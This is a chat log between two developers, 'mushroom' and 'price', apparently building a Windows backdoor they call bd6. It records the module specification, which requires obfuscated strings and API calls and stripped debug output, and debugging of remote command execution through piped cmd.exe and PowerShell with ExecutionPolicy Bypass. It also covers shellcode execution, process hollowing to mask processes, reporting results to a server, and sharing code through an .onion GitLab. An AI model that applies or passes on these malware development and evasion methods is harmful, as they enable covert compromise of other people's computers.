2020-08-20T12:37:26 mushroom -> price
Call it bd6.

2020-08-20T12:37:41 mushroom -> price
Add your files there.

2020-08-20T12:38:09 mushroom -> price
Create an empty project.

2020-08-20T12:38:19 mushroom -> price
It will be x86\x64 immediately

2020-08-20T12:38:45 price -> mushroom
What happened to the old one?

2020-08-20T12:39:21 mushroom -> price
I don't know. It's kind of weird. Only debug was Win32.

2020-08-20T12:39:26 mushroom -> price
How did you create it.

2020-08-20T12:39:34 price -> mushroom
I had an even older one, it is completely screwed up - when you start it, it opens the console and says that there is no ntoskrnl.exe

2020-08-20T12:39:56 mushroom -> price
MODULE DESIGN
1. You must have a Microsoft Visual Studio project, version at least 2015.
2. The Visual Studio project must be configured as follows:
* For ALL build profiles:
- Output directory: $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\
- Intermediate directory: $(SolutionDir)obj\$(Platform)\$(Configuration)\$(ProjectName)\
- Multiprocessor compilation: yes
* Release Profile:
- Debugging information format (C/C++ general): no
- Create debugging information (linker/debugger): no
3. Strings to obfuscate with Andrivet library (attached, see _STR() macro)
4. System calls should be obfuscated with library GetApi.h. Be careful, obfuscation of system calls may cause crashes.
5. The module must have two versions - x32- and x64-bit.
6. In the live build must be obfuscated to the maximum strings, disable all debug output.
7. The module must have a debug version. The debug output should be printed to c:/temp/modulename.log (the path to the log is configured in the macro).
Each log entry must contain a timestamp accurate to a second.
8. The project must have a file config.h (the name does not matter, the important point - here all the global settings - paths, macros-switches of conditional compilation, etc.).
9. The module must work on all modern versions of Windows.
   The minimum supported version of Windows - Windows XP (if impossible - Windows Vista).
10. Additionally the notelemetry.obj file must be added to the layout (https://stackoverflow.com/questions/37761768/how-to-prevent-visual-studio-2015-update-2-to-add-telemetry-main-invoke-trigger)

2020-08-20T12:40:04 mushroom -> price
That's how to set it up.

2020-08-20T12:40:09 mushroom -> price
Project.

2020-08-20T12:40:24 price -> mushroom
ok

2020-08-20T12:40:38 mushroom -> price
No need for obfuscation etc. yet.

2020-08-20T12:41:14 price -> mushroom
What about errors? What could it be?

2020-08-20T12:41:33 mushroom -> price
That is, implement points 1, 2, 5, 7.

2020-08-20T12:41:43 price -> mushroom
without going into depth, so as not to bore you

2020-08-20T12:41:55 mushroom -> price
What are you not finding?

2020-08-20T12:42:06 mushroom -> price
Have you tried cmd /c whoami?

2020-08-20T12:42:55 price -> mushroom
If I put /s (I've been suffering from this for a long time) it doesn't even give out a dir, if I take it out, it gives out

2020-08-20T12:43:23 mushroom -> price
Where do you do that?

2020-08-20T12:43:28 price -> mushroom
with /s empty string, without /s - no command found

2020-08-20T12:43:38 price -> mushroom
at createprocess

2020-08-20T12:43:42 price -> mushroom
cmdline

2020-08-20T12:43:50 price -> mushroom
launcher

2020-08-20T12:44:12 price -> mushroom
            lstrcpyA(cmdline, icommand == 12 ? "cmd.exe " : "powershell.exe -ExecutionPolicy Bypass -Command -");

2020-08-20T12:44:33 price -> mushroom
   if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, BOTenvironment, NULL, (LPSTARTUPINFOA)&si, &pi)) {

2020-08-20T12:45:00 mushroom -> price
Replace BOTenvironment with NULL

2020-08-20T12:45:05 price -> mushroom
And when I debugged the theme, everything worked

2020-08-20T12:45:09 price -> mushroom
except for /s

2020-08-20T12:45:15 price -> mushroom
here you go

2020-08-20T12:45:19 mushroom -> price
The process inherits all variables from the parent process anyway

2020-08-20T12:45:27 price -> mushroom
Then how do you pass the environment variable?

2020-08-20T12:45:44 price -> mushroom
Or just set it?

2020-08-20T12:45:53 mushroom -> price
They are inherited from the parent.

2020-08-20T12:45:55 price -> mushroom
SET&

2020-08-20T12:45:58 price -> mushroom
?

2020-08-20T12:46:10 price -> mushroom
How about parenting?

2020-08-20T12:46:22 mushroom -> price
In the program just do SetEnvironmentVariable

2020-08-20T12:49:22 mushroom -> price
/c should not be used if you use piping to write the script

2020-08-20T12:49:45 mushroom -> price
If you write a skip, always put \r\n at the end of each command.

2020-08-20T12:50:12 price -> mushroom
I didn't.

2020-08-20T12:50:22 price -> mushroom
And you put the carriage translation

2020-08-20T12:50:28 mushroom -> price
whoami\r\n

2020-08-20T12:50:42 price -> mushroom
And with the file, what do you need?

2020-08-20T12:50:55 mushroom -> price
Run the cmd.exe process and type in whoami\r\n in the piper

2020-08-20T12:52:02 price -> mushroom
it's working!

2020-08-20T12:52:15 price -> mushroom
and with a dump to a file - do you have to do?

2020-08-20T12:52:37 price -> mushroom
the strangeness is much less

2020-08-20T12:53:02 mushroom -> price
BOTenvironment after removing this?

2020-08-20T12:53:16 price -> mushroom
yes

2020-08-20T12:53:42 price -> mushroom
and put SetEnvironmentVariableA("VERS=", hexHashID);

2020-08-20T12:53:48 mushroom -> price
So you messed up the system variables, that's why you couldn't find what you needed.

2020-08-20T12:54:12 mushroom -> price
And now they are inherited from your program.

2020-08-20T12:54:34 price -> mushroom
and the PS started to have a normal font!!!

2020-08-20T12:54:48 price -> mushroom
uploading success to gitlab

2020-08-20T12:55:53 price -> mushroom
Too bad you sleep at night.

2020-08-20T12:56:55 mushroom -> price
Project form.

2020-08-20T12:57:03 mushroom -> price
Normal.

2020-08-20T12:57:11 price -> mushroom
yes, I will

2020-08-20T12:57:38 price -> mushroom
I mean, how did you accumulate higher?

2020-08-20T12:57:54 price -> mushroom
design requirements?

2020-08-20T12:58:07 mushroom -> price
Yes. Create an empty C++ project, add your files to it and configure it as I wrote above.

2020-08-20T12:58:16 mushroom -> price
Project name and solution bd6

2020-08-20T12:58:32 mushroom -> price
SetEnvironmentVariable("VERS"), env);

2020-08-20T12:58:48 mushroom -> price
Without =

2020-08-20T12:59:00 price -> mushroom
and without the bracket

2020-08-20T12:59:34 mushroom -> price
SetEnvironmentVariable(TEXT("VERS"), env);

2020-08-20T12:59:41 mushroom -> price
Typos.

2020-08-20T13:00:05 price -> mushroom
ok

2020-08-20T13:00:40 mushroom -> price
This is the universal version with TEXT and without the A or W suffix.

2020-08-20T13:01:30 price -> mushroom
I understand.

2020-08-20T13:07:20 mushroom -> price
About nltest not being on x86 means send what is output or error code GetLastError. Where the output in the normal situation.

2020-08-20T13:07:56 price -> mushroom
ok, will you try it yourself? just so I know

2020-08-20T13:08:16 mushroom -> price
I tried running nltest in powershell x86

2020-08-20T13:08:22 mushroom -> price
There is no such program.

2020-08-20T13:08:32 price -> mushroom
in the same way

2020-08-20T13:09:49 mushroom -> price
Generally, what is the error when you start the process, the error code in the response to this command should be sent. It turns out PID 0 Msg <Error code>.

2020-08-20T13:10:19 mushroom -> price
pid=1234
stdout and stderr here

If a startup error occurs, 0 (zero) is given as the identifier and the next line is the error message.

2020-08-20T13:10:34 mushroom -> price
That's what it says in the ToR.

2020-08-20T13:10:35 price -> mushroom
ok

2020-08-20T13:10:51 price -> mushroom
I'm just now sending a reply to the Terminator

2020-08-20T13:35:32 price -> mushroom
did a Terminate on a process that doesn't exist. This is how the system took my response:PID_0_Msg_87:

2020-08-20T13:35:52 price -> mushroom
maybe it's asking for a diagnostic text extension?

2020-08-20T13:38:05 mushroom -> price
5.4 Response to Stop Process Command 15
The result of GetLastError() immediately after TerminateProcess() is returned as the response
as a decimal number

2020-08-20T13:38:16 mushroom -> price
Just a number.

2020-08-20T13:38:43 mushroom -> price
No need to write PID, etc.

2020-08-20T13:38:53 price -> mushroom
ok

2020-08-21T09:07:21 mushroom -> price
Hi. Looked at what's in GitLab now

2020-08-21T09:07:30 mushroom -> price
The system information works fine.

2020-08-21T09:07:37 mushroom -> price
Hollowing does not work.

2020-08-21T09:07:39 price -> mushroom
Hi

2020-08-21T09:07:42 price -> mushroom
thanks

2020-08-21T09:07:50 price -> mushroom
Yes, I'm working on it.

2020-08-21T09:08:16 price -> mushroom
there in the info I've cut off two requests so far, in debugging I don't have the patience to wait 2 minutes

2020-08-21T09:08:45 mushroom -> price
Running with saving to disk works so that the response comes before the timeout, that is, the process finishes earlier than it should probably, the file is not deleted.

2020-08-21T09:08:45 price -> mushroom
I'm still learning about logging, and I want to implement it.

2020-08-21T09:09:07 mushroom -> price
bat without saving to disk works correctly.

2020-08-21T09:09:14 price -> mushroom
#define debug_logA(fmt, ...) {wprintfA(fmt, __VA_ARGS__);wfprintf(_LOG_FILE,fmt, __VA_ARGS__)}

2020-08-21T09:09:19 mushroom -> price
The save-to-disk bat is wrong.

2020-08-21T09:09:27 price -> mushroom
got it

2020-08-21T09:09:32 mushroom -> price
The output is different, but it should be the same.

2020-08-21T09:09:47 mushroom -> price
ps1 without saving to disk drops.

2020-08-21T09:09:54 PM price -> mushroom
wait a little longer?

2020-08-21T09:10:02 mushroom -> price
ps1 with save to disk drops.

2020-08-21T09:10:17 mushroom -> price
The program crashes. when ps1

2020-08-21T09:10:24 price -> mushroom
got it

2020-08-21T09:10:31 mushroom -> price
Shell code drops the program too.

2020-08-21T09:10:51 price -> mushroom
It's weird, I was running fine at night.

2020-08-21T09:11:07 price -> mushroom
I'll take a look at your Shell

2020-08-21T09:11:29 price -> mushroom
What's the script on ps1?

2020-08-21T09:11:29 mushroom -> price
I was just running mine, which is not designed for x64

2020-08-21T09:11:47 mushroom -> price
ps1 script simple cd c:\r\ndir\r\n

2020-08-21T09:11:55 mushroom -> price
For bat the same.

2020-08-21T09:12:04 price -> mushroom
I did not run yours, only 90 90 c3

2020-08-21T09:12:35 price -> mushroom
I ran this dir fine in mine, I'll take a look, of course

2020-08-21T09:13:08 mushroom -> price
The program shouldn't crash even if there's some garbage shell code running. That's what SEH is for, I gave you an example.

2020-08-21T09:13:30 price -> mushroom
I only put seh on shellcode

2020-08-21T09:13:42 mushroom -> price
Script exactly 2 commands cd c:\r\ndir\r\n

2020-08-21T09:13:42 price -> mushroom
thought and now I'll put it everywhere

2020-08-21T09:13:54 mushroom -> price
To display the contents of c:\

2020-08-21T09:14:04 price -> mushroom
I didn't have that, only the dir.

2020-08-21T09:14:16 mushroom -> price
You don't need SEH everywhere, just where the shell code runs.

2020-08-21T09:14:39 price -> mushroom
I thought on bat/ps1/exe/dll too

2020-08-21T09:15:32 price -> mushroom
on the shell is seh, I tested on the incorrect shellcode

2020-08-21T09:15:43 mushroom -> price
You don't have to do it there. There everything is checked by return code and GetLastError.

2020-08-21T09:16:14 price -> mushroom
then what does bat/ps1 fall down mean

2020-08-21T09:16:26 mushroom -> price
ps1 only goes down.

2020-08-21T09:16:27 price -> mushroom
just doesn't work

2020-08-21T09:16:35 mushroom -> price
The program is crashing.

2020-08-21T09:16:45 price -> mushroom
Got it, it's out.

2020-08-21T09:16:51 mushroom -> price
Exception.

2020-08-21T09:16:58 price -> mushroom
Then you should probably seh

2020-08-21T09:17:22 mushroom -> price
Don't. It's an error in there somewhere.

2020-08-21T09:17:37 mushroom -> price
SEH only for shell code.

2020-08-21T09:17:59 price -> mushroom
I'll take a good look, I work my way through the entire TOR on a piece of paper. I have minuses all over the place and I change them to pluses.

2020-08-21T09:18:42 price -> mushroom
Is there any problem in howlinge, or can the pattern be easily done?

2020-08-21T09:19:16 price -> mushroom
I looked at the text, but there's a lot of it. Well, I know the principle, but I haven't implemented it yet.

2020-08-21T09:19:23 mushroom -> price
In general, so check as you do. Hollowing for all masking programs, run the process with save to disk, bat cd c:\\r\ndir\r\n, ps1 cd c:\r\ndir\r\n

2020-08-21T09:19:41 price -> mushroom
I don't even remember the right one - Holoving.

2020-08-21T09:19:53 price -> mushroom
OK, I'm on it.

2020-08-21T09:19:57 mushroom -> price
Using the example I gave you.

2020-08-21T09:20:09 price -> mushroom
literally?

2020-08-21T09:20:38 price -> mushroom
holoving-doling, squeezing, I always get confused with howling-whining

2020-08-21T09:20:58 price -> mushroom
yu=b

2020-08-21T09:21:27 mushroom -> price
No not literally copy to put. For yourself, tweak what you need. Principle created a suspended process, replaced its image with your own, resumed the main process thread.

2020-08-21T09:22:23 price -> mushroom
the principle I don't know, but I will soon find out, this implementation

2020-08-21T09:22:23 mushroom -> price
It's all commented out in the code.

2020-08-21T09:22:29 price -> mushroom
ok

2020-08-21T09:22:41 mushroom -> price
In general, so check as you do. Hollowing for all masking programs, run the process with save to disk, bat cd c:\\r\ndir\r\n, ps1 cd c:\r\ndir\r\n

2020-08-21T09:22:54 price -> mushroom
ok

2020-08-21T09:23:01 mushroom -> price
How will it all work write me, then I'll look at it.

2020-08-21T09:23:08 price -> mushroom
ok

2020-08-21T09:23:16 mushroom -> price
And don't forget to make the project as I wrote yesterday.

2020-08-21T09:23:37 price -> mushroom
I've done it, except for the name of the solushenie

2020-08-21T09:23:59 price -> mushroom
in headfirst is not changing, and I did not have enough time to transfer

2020-08-21T09:24:00 mushroom -> price
Is it on GitLab?

2020-08-21T09:24:06 price -> mushroom
directories and options all set

2020-08-21T09:24:09 price -> mushroom
yes

2020-08-21T09:24:22 price -> mushroom
Maybe a bat from ps1 will work there too

2020-08-21T09:24:33 price -> mushroom
I have been intensively ruling and resetting right now

2020-08-21T09:24:36 price -> mushroom
But at night

2020-08-21T09:24:45 mushroom -> price
No. I was just taking the last one I had.

2020-08-21T09:24:46 price -> mushroom
3 to 7 a.m.

2020-08-21T09:25:00 price -> mushroom
So it's worse, I'll take a look

2020-08-21T09:25:15 price -> mushroom
But I did fix the directories.

2020-08-21T09:25:28 price -> mushroom
bin/x86/debug or release

2020-08-21T09:27:08 mushroom -> price
Redo the project all the same, still, like I said, copy the files there again to an empty project just.

2020-08-21T09:28:18 mushroom -> price
I'll give you hollowing software, you won't need test.

2020-08-21T09:30:20 price -> mushroom
OK, go ahead.

2020-08-21T09:30:24 mushroom -> price
Download: https://qaz.im/load/9erYBN/B3nZ76
Delete: https://qaz.im/index.php?a=delete&q=2095280175
Password: 123

2020-08-21T09:30:40 mushroom -> price
Infinitely outputs TestOutput

2020-08-21T09:31:07 mushroom -> price
I wrote the scripts above, you have the shell code.

2020-08-21T09:31:17 price -> mushroom
deleted

2020-08-21T09:32:39 price -> mushroom
What is U C?

2020-08-21T09:32:52 price -> mushroom
I can't guess, unicode?

2020-08-21T09:33:30 mushroom -> price
U unicode, C console application.

2020-08-21T09:34:05 price -> mushroom
And without C, GUI?

2020-08-21T09:34:26 mushroom -> price
Yes, but without the window.

2020-08-21T09:34:37 price -> mushroom
ok

2020-08-21T09:34:49 mushroom -> price
/SUBSYSTEM:WINDOWS

2020-08-21T09:34:59 price -> mushroom
it's clear

2020-08-21T09:35:00 mushroom -> price
/SUBSYSTEM:CONSOLE

2020-08-21T09:44:11 mushroom -> price
Download: https://qaz.im/load/yrDB9a/Yi22dn
Delete: https://qaz.im/index.php?a=delete&q=1266551332
Password: 123

2020-08-21T09:44:17 mushroom -> price
test dll

2020-08-21T09:44:34 price -> mushroom
ok

2020-08-21T09:44:37 mushroom -> price
Run rundll32.exe TestOutput32.dll,Run

2020-08-21T09:44:47 mushroom -> price
For example for 32 bit.

2020-08-21T09:44:53 price -> mushroom
comprehensive instruction

2020-08-21T09:44:53 mushroom -> price
Shows the window.

2020-08-21T09:46:03 mushroom -> price
In the command in Parameters Run.

2020-08-21T09:46:28 price -> mushroom
Yes, I'm aware of that.

2020-08-21T09:46:44 price -> mushroom
I wrote my tests and tested them already

2020-08-21T09:49:36 mushroom -> price
Testoutput has this kind of output:
Startup info
Desktop: Winsta0\Default
Title: Microsoft.Windows.Explorer
X: 0
Y: 0
XSize: 0
YSize: 0
XCountChars: 0
YCountChars: 0
FillAttribute: 2876548156
Flags: 257
ShowWindow: 0
StdInput: FFFFFFFFFFFFFFFFF
StdOutput:
0000000000001BB0
StdError: 0000000000001B0C

Standard output: 0000000000001BB0
Standard error: 0000000000001B0C

Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test
output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output
Test output

2020-08-21T09:49:51 mushroom -> price
This is with a timeout of 60 seconds.

2020-08-21T09:49:51 price -> mushroom
already got it

2020-08-21T09:50:15 mushroom -> price
Here you had a much smaller output with saving to disk.

2020-08-21T09:50:17 price -> mushroom
I even had to kill it with the task manager

2020-08-21T09:50:42 price -> mushroom
So I have a single print, no cycle

2020-08-21T09:51:10 mushroom -> price
It was supposed to run for 60 seconds.

2020-08-21T09:51:18 price -> mushroom
By the way, what to do with these programs

2020-08-21T09:51:27 mushroom -> price
And send the output during this time to the server.

2020-08-21T09:51:28 price -> mushroom
terminate after timazt?

2020-08-21T09:51:40 mushroom -> price
Yes. That's what came up on the server.

2020-08-21T09:51:49 price -> mushroom
And if in the background, what to send?

2020-08-21T09:52:06 price -> mushroom
when there is no time limit

2020-08-21T09:52:09 mushroom -> price
If background just PID it to the server after you run it.

2020-08-21T09:52:20 price -> mushroom
not to send the rendition?

2020-08-21T09:52:26 mushroom -> price
No.

2020-08-21T09:52:30 price -> mushroom
ok

2020-08-21T09:52:45 mushroom -> price
Anything in the background doesn't interest us.

2020-08-26T08:59:58 mushroom -> price
Hi. How's it going?

2020-08-26T11:34:47 price -> mushroom
Hi

2020-08-26T11:35:43 price -> mushroom
good progress. Corrected exe,dll. Rebuilt the program.

2020-08-26T11:37:52 price -> mushroom
Corrected the shellcode, but when I run your code, it just crashes with an error and you can't see what it's doing. But not from the program, just on the except.

2020-08-26T11:38:26 price -> mushroom
There is one last task left, holoving.

2020-08-26T11:39:41 price -> mushroom
yes, and it weighs 16 kB for x86, 20 kB for x64

2020-08-26T11:40:40 price -> mushroom
separated the standard library into a separate project No_CRT_lib.lib

2020-08-26T11:41:08 price -> mushroom
uploaded everything to gitlab.

2020-08-26T11:45:57 price -> mushroom
Except that https://n4iaacb37wmqclht.onion occasionally hangs up :(, like now I can't do Push.

2020-08-26T12:15:00 mushroom -> price
OK.

2020-08-26T12:16:02 price -> mushroom
It happens, that gitlab hangs up. I need to know-is this a typical case, or is it specific to my internet?

2020-08-26T12:16:34 price -> mushroom
And about the dll, it runs, I press OK, but no output from it.

2020-08-26T12:16:41 price -> mushroom
Not from silkhead either.

2020-08-26T12:20:28 mushroom -> price
This is a typical case, I also do not work GitLab. The dll has no output, it works in the rundll.exe process and it outputs nothing. Shell code also has no output.

2020-08-26T12:21:24 price -> mushroom
Then that's fine. I'll just sleep it off and do some holoving.

2020-08-26T12:22:04 price -> mushroom
But it's weird, I've been getting a rendition from my DLL.

2020-08-26T12:22:29 price -> mushroom
It was console, though.

2020-08-28T09:29:44 mushroom -> price
Hi. When can I see your backdoor?

2020-08-28T09:31:46 mushroom -> price
Again, I remind you to write to redmine every day, not once a week.

2020-08-28T09:31:49 price -> mushroom
put

2020-08-28T09:32:07 mushroom -> price
What's in GitLab doesn't build for me.

2020-08-28T09:32:12 price -> mushroom
There were problems with heap control, now it's solved

2020-08-28T09:32:30 price -> mushroom
What is the manifestation of?

2020-08-28T09:32:55 mushroom -> price
bd6 is not built, there is no crt_no_lib

2020-08-28T09:33:11 mushroom -> price
crt_no_lib not assembled Severity Code Description Project File String Suppression status
Error C2371 strlen: override; different basic types (compiled source file printf\printf.c) no_CRT_lib C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h 42

2020-08-28T09:33:13 price -> mushroom
So it has to be assembled as well.

2020-08-28T09:33:51 price -> mushroom
there is a project in the no_CRT_lib solution

2020-08-28T09:33:55 mushroom -> price
Make project dependencies then, so that everything you need is collected.

2020-08-28T09:34:08 mushroom -> price
no_CRT_lib
Error C2371 strlen: override; different basic types (compiled source file printf\printf.c) no_CRT_lib C:\Users\ivana\Projects\others\bd6\no_CRT_lib\printf\tinycrt.h 42

2020-08-28T09:34:15 mushroom -> price
It's not going to.

2020-08-28T09:34:33 price -> mushroom
right click on it and rebuild

2020-08-28T09:34:46 price -> mushroom
try it now.

2020-08-28T09:34:48 mushroom -> price
Same thing.

2020-08-28T09:35:02 price -> mushroom
I'll simulate in a virtual machine.

2020-08-28T09:35:09 price -> mushroom
I have everything assembled

2020-08-28T09:35:19 price -> mushroom
I haven't tried it in the vrtool.

2020-08-28T09:35:26 price -> mushroom
I also have a question.

2020-08-28T09:35:44 price -> mushroom
When I run your exe, everything works

2020-08-28T09:36:24 price -> mushroom
but I generated my own (it is also in the solution test32exe.exe it does not intercept stdout. Why?

2020-08-28T09:37:25 price -> mushroom
yes, and no_CRT_lib I only built on x86, maybe you build another one

2020-08-28T09:37:56 price -> mushroom
others are not set may have values in us

2020-08-28T09:38:06 mushroom -> price
I am building x64

2020-08-28T09:38:17 mushroom -> price
Debug x64

2020-08-28T09:38:24 price -> mushroom
try x86 debug for miscellaneous

2020-08-28T09:38:48 price -> mushroom
at least no_CRT_lib

2020-08-28T09:38:59 price -> mushroom
the bot itself is set to all options

2020-08-28T09:39:04 mushroom -> price
x64 basic build for work.

2020-08-28T09:39:14 mushroom -> price
x86 assembled no_crt

2020-08-28T09:39:19 price -> mushroom
the bot itself is set to all options

2020-08-28T09:39:30 mushroom -> price
x64 is the first thing you need.

2020-08-28T09:39:47 price -> mushroom
the bot itself is configured for all options, and for x64 too

2020-08-28T09:40:07 price -> mushroom
The static library was only on x86

2020-08-28T09:40:56 price -> mushroom
no problem setting it up for anything

2020-08-28T09:42:01 price -> mushroom
on my question can you give me a hint? Why stdout doesn't read from my test example? You can see the sorts in their respective projects.

2020-08-28T09:44:12 mushroom -> price
I write the usual printfA or printfW function there

2020-08-28T09:44:23 price -> mushroom
me too

2020-08-28T09:44:30 price -> mushroom
But I've already tried everything.

2020-08-28T09:44:50 price -> mushroom
text one line in a loop

2020-08-28T09:44:59 mushroom -> price
You write frontf.

2020-08-28T09:45:03 mushroom -> price
fprintf

2020-08-28T09:45:23 price -> mushroom
this is the last attempt, but that was of course printf

2020-08-28T09:45:48 price -> mushroom
ukfdyjt xnj d rjycjkm jyj dslftn

2020-08-28T09:46:17 price -> mushroom
The important thing is that it outputs in the console

2020-08-28T09:46:38 price -> mushroom
And in the createprocess only your

2020-08-28T09:46:46 mushroom -> price
And if you make the application not a console application.

2020-08-28T09:47:02 price -> mushroom
and I think it's the other way around, your tests don't show up in the console

2020-08-28T09:47:24 price -> mushroom
I haven't tried that, although I watched your test in the ide

2020-08-28T09:47:25 mushroom -> price
They don't, in fact, it's pale.

2020-08-28T09:48:01 price -> mushroom
So the tests

2020-08-28T09:49:07 mushroom -> price
Here's this project for you.
Download: https://qaz.im/load/DGfdrQ/YhbFK6
Delete: https://qaz.im/index.php?a=delete&q=538436343
Password: 1234567890

2020-08-28T09:49:14 price -> mushroom
I will try to go to the gui and try, although when I debugged the ecce a long time ago, I got everything everywhere and intercepted in pipes

2020-08-28T09:50:11 mushroom -> price
Adjust all project dependencies to build all x86 and x64 at once.

2020-08-28T09:50:30 price -> mushroom
ok

2020-08-28T09:51:35 price -> mushroom
You give out a lot of information for what purpose? coordinates, handles, etc.

2020-08-28T09:52:11 mushroom -> price
Just for the heap. First thing that popped into my head to output from the process.

2020-08-28T09:52:21 price -> mushroom
got it

2020-08-28T09:57:31 mushroom -> price
In fprintf you have to do flush yto be written to the stream, but there is written to the intermediate buffer first, I had it, it did not come out, but you do it in yours I see.

2020-08-28T09:57:51 price -> mushroom
I'm doing a flush, too.

2020-08-28T09:57:57 price -> mushroom
see test

2020-08-28T09:58:18 price -> mushroom
didn't finish

2020-08-28T09:58:21 price -> mushroom
я

2020-08-28T09:59:22 mushroom -> price
Also stdout doesn't seem to work with non console application. That's why I use printfA or printfW everywhere in mine.

2020-08-28T10:00:31 price -> mushroom
mysterious to me that it all worked, and it's all about the createprocess, which works for you

2020-08-28T10:02:30 mushroom -> price
Maybe because test32 is a Unicode application, fprintf is an ANSI function.

2020-08-28T10:03:01 price -> mushroom
There's a wide version as well.

2020-08-28T10:03:20 price -> mushroom
And fprintf got up at the last moment

2020-08-28T10:03:33 price -> mushroom
so it was printf

2020-08-28T10:03:53 mushroom -> price
printf also ANSI

2020-08-28T10:03:54 price -> mushroom
It prints to the console!

2020-08-28T10:04:29 price -> mushroom
I have debug_printf look it up-it is unicode

2020-08-28T10:04:44 price -> mushroom
I pass the L" line into it

2020-08-28T10:26:39 mushroom -> price
Checked myself. Everything works with your test32exe.exe

2020-08-28T10:27:04 price -> mushroom
That's what I'm saying.

2020-08-28T10:27:19 mushroom -> price
test32dll.exe no output.

2020-08-28T10:27:29 price -> mushroom
this is bullshit, moreover I even had a dll return

2020-08-28T10:28:56 price -> mushroom
was before, I now know from you that rundll32 doesn't give out anything, but when I didn't know, I got

2020-08-28T10:33:25 mushroom -> price
LPSTARTUPINFOA

2020-08-28T10:33:44 mushroom -> price
And your program is Unicode.

2020-08-28T10:33:59 mushroom -> price
STARTUPINFO si = { 0 };

2020-08-28T10:34:13 mushroom -> price
Create a Unicode STARTUPINFOW

2020-08-28T10:34:38 mushroom -> price
You pass CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOA)&si, &pi)

2020-08-28T10:34:48 mushroom -> price
LPSTARTUPINFOA

2020-08-28T10:35:05 price -> mushroom
thanks

2020-08-28T10:35:35 mushroom -> price
But it's not the fact that it's because of that, I noticed that, but didn't check it.

2020-08-28T10:35:51 price -> mushroom
But with your test it doesn't explain

2020-08-28T10:36:28 mushroom -> price
You get so confused either write everything in ANSI or everything in UNICODE, or use unifvrsal versions of functions and structures without A or W.

2020-08-28T10:36:51 mushroom -> price
Better in ANSI, then the file size will be smaller.

2020-08-28T10:38:05 price -> mushroom
I don't have all the functions for Ansi, but of course you're right. I'm fighting with memory now, I'll get into Unicode as well.

2020-08-28T10:40:42 mushroom -> price
Then it's all in unicode.

2020-08-28T10:40:56 price -> mushroom
ok

2020-08-28T10:41:00 mushroom -> price
In your program you should use the Unicode character set

2020-08-28T10:41:09 price -> mushroom
I know

2020-08-28T10:41:20 mushroom -> price
So anything without an A or W turns into a W

2020-08-28T10:41:23 price -> mushroom
If you change to multibyats this will be trouble

2020-08-28T10:41:34 price -> mushroom
I also know

2020-08-28T10:41:59 mushroom -> price
That's why I use universal names, so you can easily change the encoding.

2020-08-28T10:42:50 mushroom -> price
si.dwFlags = STARTF_USESHOWWINDOW

2020-08-28T10:42:55 mushroom -> price
What's that for?

2020-08-28T10:43:06 mushroom -> price
si.wShowWindow = SW_HIDE;

2020-08-28T10:43:10 mushroom -> price
And that?

2020-08-28T10:43:32 mushroom -> price
This is easier to do in the process creation function via a flag.

2020-08-28T10:44:19 mushroom -> price
CREATE_NO_WINDOW

2020-08-28T10:44:33 mushroom -> price
https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags

2020-08-28T10:46:41 mushroom -> price
Just info->dwFlags |= STARTF_USESTDHANDLES;

2020-08-28T10:47:01 mushroom -> price
For pip, no other flags are needed for startupinfo

2020-08-28T10:47:34 price -> mushroom
corrected

2020-08-28T10:48:33 mushroom -> price
Check it yourself, opened the project selected bd6 x86\x64 to build, everything was built on the machine needed.

2020-08-28T10:48:55 price -> mushroom
Checking

2020-08-28T10:49:20 price -> mushroom
Checking flags now, dependencies are next

2020-08-28T10:49:31 mushroom -> price
Check as I said all possible scenarios, as I wrote last week. And then text me and I'll look into it.

2020-08-28T10:50:46 price -> mushroom
ok

2020-08-28T10:50:48 price -> mushroom
thanks

2020-08-28T11:17:52 mushroom -> price
Nothing to see in the next couple of hours? I'll step back then.

2020-08-28T11:18:07 price -> mushroom
no

2020-08-28T11:18:11 price -> mushroom
go to

2020-08-28T11:18:18 PM mushroom -> price
OK.

2020-08-31T09:49:45 mushroom -> price
Hi. In project bd6 Compiler\Input/Additional Dependencies, write $(SolutionDir)bin\$(PlatformTarget)\$(Configuration)\No_CRT_lib.lib

2020-08-31T09:50:10 mushroom -> price
To locate your library.

2020-08-31T09:50:11 price -> mushroom
hi

2020-08-31T09:50:25 mushroom -> price
Everything else is still not working.

2020-08-31T09:50:37 price -> mushroom
this is weird

2020-08-31T09:50:39 mushroom -> price
Hollowing doesn't work, scripts don't work.

2020-08-31T09:50:44 price -> mushroom
that's just what I checked.

2020-08-31T09:50:54 price -> mushroom
Holdoving doesn't work

2020-08-31T09:51:16 price -> mushroom
But 1 command, 10, 11, 12 work

2020-08-31T09:51:16 mushroom -> price
That's what I meant.

2020-08-31T09:51:39 price -> mushroom
I'm in the middle of a hollovinglm right now.

2020-08-31T09:51:41 mushroom -> price
With saving to the exe disk, it works.

2020-08-31T09:51:57 mushroom -> price
The scripts don't work.

2020-08-31T09:52:08 mushroom -> price
dbf20612adcd2353521bf5ef68c5a3a4

2020-08-31T09:52:39 mushroom -> price
You can see there more than one script that didn't work.

2020-08-31T09:53:26 mushroom -> price
Didn't check the other one.

2020-08-31T09:53:40 price -> mushroom
ok

2020-08-31T09:53:50 price -> mushroom
checking

2020-08-31T09:54:49 price -> mushroom
here's about halloving - is it working in the bot or just an example?

2020-08-31T09:55:05 price -> mushroom
processhelper.cpp

2020-08-31T10:20:23 mushroom -> price
Working.

2020-08-31T10:20:33 price -> mushroom
ok

2020-09-01T11:25:30 mushroom -> price
Hi took a look at the latest on gitlab. The scripts are working. One snag with the bat script from disk. If cd c:\\r\ndir\r\n run through pip everything works as it should, if from disk the output is different (no contents of c:\). Here are the last 2 commands.

2020-09-01T11:25:56 mushroom -> price
I take it you haven't done the hollering yet, there's the same error as yesterday 87.

2020-09-01T11:25:58 price -> mushroom
Hi, thanks for watching.

2020-09-01T11:26:12 price -> mushroom
I'm doing it now, we'll see tomorrow.

2020-09-01T11:26:39 price -> mushroom
I found a bug in my pile release yesterday, it was bothering me a lot

